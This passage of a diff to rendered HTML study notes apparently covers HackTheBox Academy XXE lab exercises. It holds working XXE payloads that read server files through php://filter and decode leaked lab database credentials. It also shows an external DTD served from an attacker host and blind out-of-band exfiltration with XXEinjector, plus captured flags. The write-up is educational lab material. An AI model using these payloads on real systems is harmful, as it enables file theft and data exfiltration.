+</span><span id="__span-323-7"><a id="__codelineno-323-7" name="__codelineno-323-7"></a>Content-Type: text/plain;charset=UTF-8
+</span><span id="__span-323-8"><a id="__codelineno-323-8" name="__codelineno-323-8"></a>Content-Length: 266
+</span><span id="__span-323-9"><a id="__codelineno-323-9" name="__codelineno-323-9"></a>Origin: http://10.129.13.187
+</span><span id="__span-323-10"><a id="__codelineno-323-10" name="__codelineno-323-10"></a>Connection: keep-alive
+</span><span id="__span-323-11"><a id="__codelineno-323-11" name="__codelineno-323-11"></a>Referer: http://10.129.13.187/
+</span><span id="__span-323-12"><a id="__codelineno-323-12" name="__codelineno-323-12"></a>
+</span><span id="__span-323-13"><a id="__codelineno-323-13" name="__codelineno-323-13"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+</span><span id="__span-323-14"><a id="__codelineno-323-14" name="__codelineno-323-14"></a>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=file:////var/www/html/connection.php&quot; &gt; ]&gt;
+</span><span id="__span-323-15"><a id="__codelineno-323-15" name="__codelineno-323-15"></a>&lt;root&gt;
+</span><span id="__span-323-16"><a id="__codelineno-323-16" name="__codelineno-323-16"></a>&lt;name&gt;
+</span></code></pre></div></td></tr></table></div>
+<p>Finally, we decode it: </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-324-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-324-1"><a id="__codelineno-324-1" name="__codelineno-324-1"></a>sudo echo &quot;PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K&quot; | base64 -d
+</span></code></pre></div></td></tr></table></div>
+<p>Results: UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg</p>
+<p><strong>Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').</strong>
+To bypass the previous limitation, we can utilize <code>XML Parameter Entities</code>, a special type of entity that starts with a <code>%</code> character and can only be used within the DTD: What's unique about parameter entities is that if we reference them from an external source.</p>
+<div class="language-xml highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-325-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-325-1"><a id="__codelineno-325-1" name="__codelineno-325-1"></a><span class="cp">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>So the final attack would be:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-326-1">1</a></span>
+<span class="normal"><a href="#__codelineno-326-2">2</a></span>
+<span class="normal"><a href="#__codelineno-326-3">3</a></span>
+<span class="normal"><a href="#__codelineno-326-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-326-1"><a id="__codelineno-326-1" name="__codelineno-326-1"></a><span class="c1"># From our kali</span>
+</span><span id="__span-326-2"><a id="__codelineno-326-2" name="__codelineno-326-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>xxe.dtd
+</span><span id="__span-326-3"><a id="__codelineno-326-3" name="__codelineno-326-3"></a>
+</span><span id="__span-326-4"><a id="__codelineno-326-4" name="__codelineno-326-4"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</span></code></pre></div></td></tr></table></div>
+<p>In the attacking payload that is uploaded to the target server:</p>
+<div class="language-xml highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-327-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-327-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-327-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-327-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-327-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-327-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-327-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-327-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-327-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-327-10">10</a></span>
+<span class="normal"><a href="#__codelineno-327-11">11</a></span>
+<span class="normal"><a href="#__codelineno-327-12">12</a></span>
+<span class="normal"><a href="#__codelineno-327-13">13</a></span>
+<span class="normal"><a href="#__codelineno-327-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-327-1"><a id="__codelineno-327-1" name="__codelineno-327-1"></a><span class="cp">&lt;!DOCTYPE email [</span>
+</span><span id="__span-327-2"><a id="__codelineno-327-2" name="__codelineno-327-2"></a><span class="cp">  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt;</span><span class="w"> </span><span class="cm">&lt;!-- prepend the beginning of the CDATA tag --&gt;</span>
+</span><span id="__span-327-3"><a id="__codelineno-327-3" name="__codelineno-327-3"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///flag.php&quot;&gt;</span><span class="w"> </span><span class="cm">&lt;!-- reference external file --&gt;</span>
+</span><span id="__span-327-4"><a id="__codelineno-327-4" name="__codelineno-327-4"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % end &quot;]]&gt;</span>&quot;&gt;<span class="w"> </span><span class="cm">&lt;!-- append the end of the CDATA tag --&gt;</span>
+</span><span id="__span-327-5"><a id="__codelineno-327-5" name="__codelineno-327-5"></a><span class="w">  </span><span class="cp">&lt;!ENTITY % xxe SYSTEM &quot;http://10.10.14.207:8000/xxe.dtd&quot;&gt;</span><span class="w"> </span><span class="cm">&lt;!-- reference our external DTD --&gt;</span>
+</span><span id="__span-327-6"><a id="__codelineno-327-6" name="__codelineno-327-6"></a><span class="w">  </span>%xxe;
+</span><span id="__span-327-7"><a id="__codelineno-327-7" name="__codelineno-327-7"></a>]&gt;
+</span><span id="__span-327-8"><a id="__codelineno-327-8" name="__codelineno-327-8"></a>
+</span><span id="__span-327-9"><a id="__codelineno-327-9" name="__codelineno-327-9"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-327-10"><a id="__codelineno-327-10" name="__codelineno-327-10"></a><span class="nt">&lt;name&gt;&lt;/name&gt;</span>
+</span><span id="__span-327-11"><a id="__codelineno-327-11" name="__codelineno-327-11"></a><span class="nt">&lt;tel&gt;&lt;/tel&gt;</span>
+</span><span id="__span-327-12"><a id="__codelineno-327-12" name="__codelineno-327-12"></a><span class="nt">&lt;email&gt;</span><span class="ni">&amp;joined;</span><span class="nt">&lt;/email&gt;</span><span class="cm">&lt;!-- reference the &amp;joined; entity to print the file content --&gt;</span>
+</span><span id="__span-327-13"><a id="__codelineno-327-13" name="__codelineno-327-13"></a><span class="nt">&lt;message&gt;&lt;/message&gt;</span>
+</span><span id="__span-327-14"><a id="__codelineno-327-14" name="__codelineno-327-14"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Note:</strong> In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop).</p>
+<p><img alt="" src="../img/xxe_25.png" /></p>
+<p>Results:  HTB{3rr0r5_c4n_l34k_d474}</p>
+<p><strong>Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.</strong></p>
+<p>We will use the tool XXEInjector:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-328-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-328-1"><a id="__codelineno-328-1" name="__codelineno-328-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/enjoiz/XXEinjector.git
+</span></code></pre></div></td></tr></table></div>
+<p>Once cloned, we will save our potentially vulnerable request into a file <code>xxe.req</code>. We will place the word <code>XXEINJECT</code> as a position locator for the tool:</p>
+<div class="language-http highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-329-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-329-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-329-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-329-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-329-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-329-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-329-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-329-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-329-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-329-10">10</a></span>
+<span class="normal"><a href="#__codelineno-329-11">11</a></span>
+<span class="normal"><a href="#__codelineno-329-12">12</a></span>
+<span class="normal"><a href="#__codelineno-329-13">13</a></span>
+<span class="normal"><a href="#__codelineno-329-14">14</a></span>
+<span class="normal"><a href="#__codelineno-329-15">15</a></span>
+<span class="normal"><a href="#__codelineno-329-16">16</a></span>
+<span class="normal"><a href="#__codelineno-329-17">17</a></span>
+<span class="normal"><a href="#__codelineno-329-18">18</a></span>
+<span class="normal"><a href="#__codelineno-329-19">19</a></span>
+<span class="normal"><a href="#__codelineno-329-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-329-1"><a id="__codelineno-329-1" name="__codelineno-329-1"></a><span class="nf">POST</span> <span class="nn">/blind/submitDetails.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-329-2"><a id="__codelineno-329-2" name="__codelineno-329-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">10.129.210.196</span>
+</span><span id="__span-329-3"><a id="__codelineno-329-3" name="__codelineno-329-3"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
+</span><span id="__span-329-4"><a id="__codelineno-329-4" name="__codelineno-329-4"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+</span><span id="__span-329-5"><a id="__codelineno-329-5" name="__codelineno-329-5"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+</span><span id="__span-329-6"><a id="__codelineno-329-6" name="__codelineno-329-6"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span><span id="__span-329-7"><a id="__codelineno-329-7" name="__codelineno-329-7"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/plain;charset=UTF-8</span>
+</span><span id="__span-329-8"><a id="__codelineno-329-8" name="__codelineno-329-8"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">167</span>
+</span><span id="__span-329-9"><a id="__codelineno-329-9" name="__codelineno-329-9"></a><span class="na">Origin</span><span class="o">:</span> <span class="l">http://10.129.210.196</span>
+</span><span id="__span-329-10"><a id="__codelineno-329-10" name="__codelineno-329-10"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span><span id="__span-329-11"><a id="__codelineno-329-11" name="__codelineno-329-11"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">http://10.129.210.196/blind/</span>
+</span><span id="__span-329-12"><a id="__codelineno-329-12" name="__codelineno-329-12"></a>
+</span><span id="__span-329-13"><a id="__codelineno-329-13" name="__codelineno-329-13"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+</span><span id="__span-329-14"><a id="__codelineno-329-14" name="__codelineno-329-14"></a>XXEINJECT
+</span><span id="__span-329-15"><a id="__codelineno-329-15" name="__codelineno-329-15"></a>&lt;root&gt;
+</span><span id="__span-329-16"><a id="__codelineno-329-16" name="__codelineno-329-16"></a>&lt;name&gt;lala&lt;/name&gt;
+</span><span id="__span-329-17"><a id="__codelineno-329-17" name="__codelineno-329-17"></a>&lt;tel&gt;11237865432&lt;/tel&gt;
+</span><span id="__span-329-18"><a id="__codelineno-329-18" name="__codelineno-329-18"></a>&lt;email&gt;lala@lalal.com&lt;/email&gt;
+</span><span id="__span-329-19"><a id="__codelineno-329-19" name="__codelineno-329-19"></a>&lt;message&gt;sksaka&lt;/message&gt;
+</span><span id="__span-329-20"><a id="__codelineno-329-20" name="__codelineno-329-20"></a>&lt;/root&gt;
+</span></code></pre></div></td></tr></table></div>
+<p>Now we can run the tool:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-330-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-330-1"><a id="__codelineno-330-1" name="__codelineno-330-1"></a>ruby<span class="w"> </span>XXEinjector.rb<span class="w"> </span>--host<span class="o">=</span><span class="m">10</span>.10.14.207<span class="w"> </span>--httpport<span class="o">=</span><span class="m">8000</span><span class="w"> </span>--file<span class="o">=</span>xxe.req<span class="w"> </span>--path<span class="o">=</span>/327a6c4304ad5938eaf0efb6cc3e53dc.php<span class="w"> </span>--oob<span class="o">=</span>http<span class="w"> </span>--phpfilter
+</span></code></pre></div></td></tr></table></div>
+<p>And see the logs under the new created Log folder within the tool:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-331-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-331-1"><a id="__codelineno-331-1" name="__codelineno-331-1"></a>cat<span class="w"> </span>Logs/10.129.210.196/327a6c4304ad5938eaf0efb6cc3e53dc.php.log<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<p>Results: </p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-332-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-332-1"><a id="__codelineno-332-1" name="__codelineno-332-1"></a>&lt;?php $flag = &quot;HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}&quot;; ?&gt;
+</span></code></pre></div></td></tr></table></div>
+<p>Results: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}</p>
+<h3 id="skills-assessment_5">Skills Assessment</h3>
+<p>Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-333-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-333-1"><a id="__codelineno-333-1" name="__codelineno-333-1"></a>
+</span></code></pre></div></td></tr></table></div>
+<p>Results:</p>
 <h2 id="attacking-common-applications"><a href="https://academy.hackthebox.com/module/details/113">Attacking Common Applications</a></h2>
 <h2 id="linux-privilege-escalation"><a href="https://academy.hackthebox.com/module/details/51">Linux Privilege Escalation</a></h2>
 <h2 id="windows-privilege-escalation"><a href="https://academy.hackthebox.com/module/details/67">Windows Privilege Escalation</a></h2>
 <h2 id="documentation-reporting"><a href="https://academy.hackthebox.com/module/details/162">Documentation &amp; Reporting</a></h2>
 <h2 id="attacking-enterprise-networks"><a href="https://academy.hackthebox.com/module/details/163">Attacking Enterprise Networks</a></h2>
 <p>Question</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-313-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-313-1"><a id="__codelineno-313-1" name="__codelineno-313-1"></a>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-334-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-334-1"><a id="__codelineno-334-1" name="__codelineno-334-1"></a>
 </span></code></pre></div></td></tr></table></div>
 <p>Results: </p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-08T21:45:55+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-08</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-13T04:23:33+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-13</span></small></br>
 
 
     <small>Created: May 31, 2024 18:03:27</small>
